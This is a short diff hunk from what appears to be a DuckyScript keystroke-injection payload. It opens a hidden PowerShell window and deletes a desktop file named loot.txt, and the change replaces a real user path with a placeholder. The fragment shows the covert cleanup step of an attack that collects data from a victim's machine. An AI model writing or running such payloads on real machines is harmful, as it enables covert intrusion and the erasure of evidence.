@@ -208,6 +208,6 @@ STRING powershell -windowstyle hidden
 DELAY 200
 ENTER
 DELAY 500
-STRING Remove-Item "C:\Users\march\OneDrive\Desktop\loot.txt"
+STRING Remove-Item "C:\Users\NAME\NAME\Desktop\loot.txt"
 DELAY 500
 ENTER
